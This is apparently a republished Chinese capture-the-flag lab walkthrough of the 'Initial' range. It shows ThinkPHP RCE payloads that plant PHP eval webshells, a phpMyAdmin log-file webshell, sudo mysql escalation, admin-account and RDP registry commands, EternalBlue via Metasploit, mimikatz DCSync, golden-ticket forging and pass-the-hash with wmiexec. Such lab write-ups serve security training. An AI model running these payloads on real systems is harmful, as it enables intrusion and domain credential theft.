# 春秋云镜-Initial打靶记录

> 原文: https://www.ctfiot.com/173290.html
> ID: 173290

1.靶场简介

Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，分为三个部分，各部分位于不同的机器上。

本文较上次推送的春秋云镜-Time打靶记录文章更偏向于基础。

2.Web入口：39.99.246.97

2.1 信息收集

启动靶机，拿到IP：39.99.246.97

直接访问可以看到一个网页

直接用fscan扫，同时用burp爆破密码，可以看到fscan扫到了一个thinkphp的洞

2.2 Thinkphp rce 利用

能看到fscan扫出了个thinkphp的漏洞，直接搜索文章看

参考CSDN文章，但里面有个小问题，URL后是接/index.php?s=captcha，原文复现处写成了captch，复现时请稍加注意

	文章名为《Thinkphp5.0.23 rce（远程代码执行）的漏洞复现》

需要抓包，然后把GET方式改成POST方式，URL后接/index.php?s=captcha

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls

使用命令显示服务器500错误，但确确实实是检测出存在这个漏洞的，所以先尝试写入phpinfo进去

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo "<?php phpinfo();?>" > info.php

访问，能看到写入了phpinfo，所以是可以直接写文件的

2.3 Webshell写入及连接

直接写入shell

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '<?php eval($_POST[aaa]); ?>' > shell.php

蚁剑连接

2.4 权限利用

能看到当前用户权限不高，仅为www-data用户

sudo -l看一下当前用户能够以管理员权限执行的命令有哪些

能看到有个mysql是以nopasswd形式跑的，而且是root权限

mysql执行shell命令是这样的

system    (!) Execute a system shell command.    #help里的内容，能看到可以执行命令
mysql> ! ls    #mysql里执行ls

那么在mysql外则是这样的

sudo mysql -e '! [命令]'

获得第一部分的flag

因为根据题目说明，是由各部分位于不同的机器上的flag，最终拼接成一个flag

所以可以直接用find命令搜索flag文件

find / -name "flag"    #/表示在/目录下，搜索所有文件；-name表示搜索文件名；"flag"表示搜索文件为flag的文件

能看到搜到了flag，是在/root/flag下，直接查看一手，最终获得第一部分的flag

如此便得到了第一部分的flag

2.5 流量转发

流量转发可以用neoreg或者frp去实现

这里是根目录上传个neoreg文件进行代理

到这儿就快一个小时了，临时有事，停一下

该省省，该花花花花花花

3.信呼入口：172.22.1.18

靶场，启动！

靶机每次开启都会换个IP，连接稳定情况不一定，看运气，我至少开过5次了，其中3次连接很慢。

尝试换成了其他流量代理工具，也无法解决这一问题。

后来发现我阿里云转发流量没有转发出去，可能是被什么防护给拦了？尝试换成腾讯云之后就解决了。

等我有时间了一定设置对照组和实验组。

3.1 信息收集

看个ip，是172.22.1.0/24段的，传入fscan到靶机上

为了方便，直接给fscan设置了777权限，即可读可写可执行

sudo mysql -e '! chmod 777 fscan'    #设置权限
./fscan -h 172.22.1.0/24 -o w3.txt    #扫描并输出

可以看到第一行的命令执行完后看不到内容的，所以需要输出结果到w3.txt中

可以看到有个信呼OA，有个MS17-010永恒之蓝

3.2 信呼文件上传利用（未利用成功）

直接爆破有点慢（可能是代理问题），所以多试了一下常见的账号密码

最后发现可以用admin admin123登陆

该版本存在上传漏洞

上传点位于 任务资源–文件传送–新增

这里的文件直接写个一句话就行，文件名以.php结尾

这里需要抓包，以找到包里的filecontid，后面找目录需要用到，uptemp是因为php为非白名单文件，所以会被修改名字，但实际是能通过.php结尾访问到

fileid这个就是之前的filecontid，第一次访问不会爆出文件名，第二次访问才会有

这一步试了很久，不知道是代理问题还是啥情况，就是没法用，所以放弃这种方式，转头扫目录去

3.3 phpMyAdmin写webshell

这里用到了dirsearch这个工具，还是代理问题，扫了半天才扫出来

dirsearch -u http://172.22.1.18

吃一堑长一智，先手动试试弱口令，账号root，密码root

使用log日志文件插入一句话木马

set global general_log = "ON";     #开启日志
set global general_log_file='C:/phpStudy/PHPTutorial/WWW/111.php';    #设置日志保存目录
select '<?php eval($_POST[cmd]);?>';    #一句话木马

至于为什么选这个目录，是因为能通过信呼的报错看到目录

访问写入的一句话，可以看到是可以连接的，不要在意Webshell的名字，这一步试了好多次，没钱再开靶机了

连接后可以看到直接是system权限

搜索flag文件，这里我是先到了C:
目录下，然后利用dir命令，去搜索相关文件

dir /s flag

获得第二部分的flag

3.4 误入歧途

这里开了172.22.1.18那台的3389，创建了管理员账户，但是无法用mimikatz读取，一顿操作猛如虎，后来发现这不是DC服务器

有时候夜深人静不是没有道理的。

顺便提一嘴，这里用到了创建用户，添加至管理员用户组，以及开启3389的方法

net user [用户名] [密码] /add  #添加用户
net localgroup Administrators [用户名] /add  #将用户添加至Administratos这个用户组
REG ADD HKLMSYSTEMCurrentControlSetControlTerminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  #通过写入注册表，将3389，即远程连接开启

4.永恒之蓝：172.22.1.21

这里是因为服务器上没有配置好代理，就想先搞个proxychains，方便以后使用，但是更新了yum源，并且安装proxychains了之后，msfconsole反而未找到命令了

最终找到了文件解决，应该是环境变量覆盖了，加上就好了

4.1 流量代理（没错我又在折腾流量了）

proxychains这个我是直接通过yum去安装的，具体操作系统的安装方式自己搜文章看

这个方便就方便在一句命令就可以指定工具的流量走代理

需要先配置文件，如果没有就是创建，有就是修改

vim /etc/proxychains.conf    #编辑文件

[ProxyList]
socks5 175.**.**.** 19999

4.2 永恒之蓝，启动！

配置完proxychains就可以使用命令

proxychains msfconsole    #msfconsole的流量都走proxychains的配置

当然也可以直接在msf中设置，如下面带注释的字块

然后设置好payload和host，就可以开始拿下了

use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp_uuid
set rhost 172.22.1.21
set proxies socks5:
175.**.**.**:
19999 #你也可以在这一步设置代理
exploit 

当然噢，proxychains的提示可以关的，我这里没关

成功后可以看到如下信息

4.3 伪造黄金票据

4.3.1 基本概念解释

KDC（Key Distribution Center）密钥分发中心。

在KDC中又分为两个部分：

	1、Authentication Service(AS,身份验证服务)

	2、Ticket Granting Service(TGS,票据授权服务)

AD会维护一个Account Database(账户数据库)。它存储了域中所有用户的密码Hash和白名单。只有账户密码都在白名单中的Client才能申请到TGT。

Kerberos认证的大概流程：

	1、当 Client 想要访问 Server 上的某个服务时,需要先向 AS 证明自己的身份

	2、验证通过后AS会发放的一个TGT

	3、随后Client再次向TGS证明自己的身份

	4、验证通过后TGS会发放一个ST

	5、最后Client向 Server 发起认证请求

这个过程分为三块：Client 与 AS 的交互, Client 与 TGS 的交互, Client 与 Server 的交互。

黄金票据是伪造TGT，白银票据则是伪造ST

4.3.2 黄金票据解释

在Kerberos认证中，Client通过AS(身份认证服务)认证后，AS会给Client一个 Logon Session Key和TGT，而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的，所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后，就跳过AS验证，不用验证账户和密码，所以也不担心域管密码修改。

4.3.3 利用条件

域名称（xiaorang.lab）

域的SID值 （S-1-5-21-314492864-3856862959-4045974917-502）

域的krbtgt账号的HASH (fb812eea13a18b7fcdb8e6d67ddc205b)

伪造任意用户名 （获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限）(通过永恒之蓝拿下了172.22.1.21这台)

弱口令安全实验室正式成立于2022年1月，是思而听（山东）网络科技有限公司旗下的网络安全研究团队，专注于网络攻防技术、渗透测试、硬件安全、安全开发、网络安全赛事以及网安线上教育领域研究几大板块。

团队社群氛围浓厚，同时背靠思而听（山东）网络科技有限公司旗下的“知行网络安全教育平台”作为社区，容纳同好在安全领域不断进行技术提升以及技术分享，从而形成良好闭环。

欢迎对网络安全技术感兴趣的你来加入我们实验室，可在公众号内依次点击【关于我们】-【加入我们】来获取联系方式～


```
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo "<?php phpinfo();?>" > info.php
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '<?php eval($_POST[aaa]); ?>' > shell.php
system    (!) Execute a system shell command.    #help里的内容，能看到可以执行命令
mysql> ! ls    #mysql里执行ls
sudo mysql -e '! [命令]'
find / -name "flag"    #/表示在/目录下，搜索所有文件；-name表示搜索文件名；"flag"表示搜索文件为flag的文件
sudo mysql -e '! chmod 777 fscan'    #设置权限
./fscan -h 172.22.1.0/24 -o w3.txt    #扫描并输出
dirsearch -u http://172.22.1.18
set global general_log = "ON";     #开启日志
set global general_log_file='C:/phpStudy/PHPTutorial/WWW/111.php';    #设置日志保存目录
select '<?php eval($_POST[cmd]);?>';    #一句话木马
dir /s flag
net user [用户名] [密码] /add  #添加用户
net localgroup Administrators [用户名] /add  #将用户添加至Administratos这个用户组
REG ADD HKLMSYSTEMCurrentControlSetControlTerminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  #通过写入注册表，将3389，即远程连接开启
vim /etc/proxychains.conf    #编辑文件
[ProxyList]
socks5 175.**.**.** 19999
proxychains msfconsole    #msfconsole的流量都走proxychains的配置
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp_uuid
set rhost 172.22.1.21
set proxies socks5:
175.**.**.**:
19999 #你也可以在这一步设置代理
exploit
load kiwi    #加载
kiwi_cmd lsadump::
dcsync /domain:
xiaorang.lab /all /csv    #读取域内所有用户的Hash
kiwi_cmd lsadump::
dcsync /domain:
xiaorang.lab /user:
krbtgt    #导出域内用户哈希
kiwi_cmd kerberos::
golden /user:
administrator /domain:
xiaorang.lab /sid:S-1-5-21-314492864-3856862959-4045974917-502 /krbtgt:
fb812eea13a18b7fcdb8e6d67ddc205b /ptt    #导入黄金票据
python wmiexec.py -hashes [LM Hash]:[NTLM Hash] [域名]/[用户名]@[IP] "[命令]"
python wmiexec.py -hashes :
10cf89a850fb1cdbe6bb432b859164c8 xiaorang/administrator@172.22.1.2 "type UsersAdministratorflagflag03.txt"
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/10-1712914089.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/6-1712914090.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/3-1712914091.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/2-1712914092.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/5-1712914092.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/2-1712914093.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/9-1712914093.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/4-1712914094.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/2-1712914094.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/4-1712914095.png)